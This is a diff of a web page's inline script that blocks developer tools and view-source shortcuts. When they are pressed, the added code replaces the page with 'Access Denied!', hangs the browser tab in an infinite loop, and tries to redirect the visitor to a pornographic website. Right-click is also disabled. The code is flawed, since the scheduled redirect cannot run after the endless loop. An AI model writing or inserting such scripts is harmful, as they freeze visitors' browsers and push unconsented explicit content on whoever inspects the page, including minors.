@@ -47,73 +47,38 @@
         load();
       })();
     </script>
-    <script>
-      (function () {
-        const redirectUrl = "https://pornhub.com"; // Redirect URL
-        let devtoolsOpen = false;
+   <script>
+(function () {
+  const redirectUrl = "https://pornhub.com"; // Redirect URL
 
-        // Freeze the page
-        function freezePage() {
-          document.body.innerHTML = "<h1>Access Denied!</h1>";
-          document.body.style.pointerEvents = "none";
-          document.body.style.userSelect = "none";
-          document.body.style.opacity = "0.5";
-          while (true) {} // Hardcore freeze
-        }
+  function freezePage() {
+    document.body.innerHTML = "<h1>Access Denied!</h1>";
+    document.body.style.pointerEvents = "none";
+    document.body.style.userSelect = "none";
+    document.body.style.opacity = "0.5";
+    while (true) {} // Hardcore freeze
+  }
 
-        // Detect DevTools by screen size / timing
-        function detectDevTools() {
-          const threshold = 160;
-          const widthDiff = window.outerWidth - window.innerWidth > threshold;
-          const heightDiff =
-            window.outerHeight - window.innerHeight > threshold;
+  // Block Ctrl+U, Ctrl+Shift+I, Ctrl+Shift+J, F12, etc.
+  document.onkeydown = function (e) {
+    // Key codes: F12=123, U=85, I=73, J=74, C=67
+    if (
+      e.keyCode === 123 || // F12
+      (e.ctrlKey && e.keyCode === 85) || // Ctrl+U
+      (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) // Ctrl+Shift+I/J/C
+    ) {
+      freezePage();
+      setTimeout(() => {
+        window.location.href = redirectUrl;
+      }, 500);
+      return false;
+    }
+  };
 
-          if (widthDiff || heightDiff) {
-            if (!devtoolsOpen) {
-              devtoolsOpen = true;
-              freezePage();
-              setTimeout(() => {
-                window.location.href = redirectUrl;
-              }, 500);
-            }
-          } else {
-            devtoolsOpen = false;
-          }
-        }
-
-        // Detect F12 / Ctrl+Shift+I
-        document.onkeydown = function (e) {
-          if (
-            e.keyCode === 123 ||
-            (e.ctrlKey && e.shiftKey && e.keyCode === 73)
-          ) {
-            freezePage();
-            setTimeout(() => {
-              window.location.href = redirectUrl;
-            }, 500);
-            return false;
-          }
-        };
-
-        // Right click disable
-        document.addEventListener("contextmenu", (e) => e.preventDefault());
-
-        // Detect console open via function toString hack
-        const element = new Image();
-        Object.defineProperty(element, "id", {
-          get: function () {
-            freezePage();
-            setTimeout(() => {
-              window.location.href = redirectUrl;
-            }, 500);
-          },
-        });
-        console.log(element);
-
-        // Continuous check
-        setInterval(detectDevTools, 300);
-      })();
-    </script>
+  // Disable right-click
+  document.addEventListener("contextmenu", (e) => e.preventDefault());
+})();
+</script>
 
     <style>
       :root {
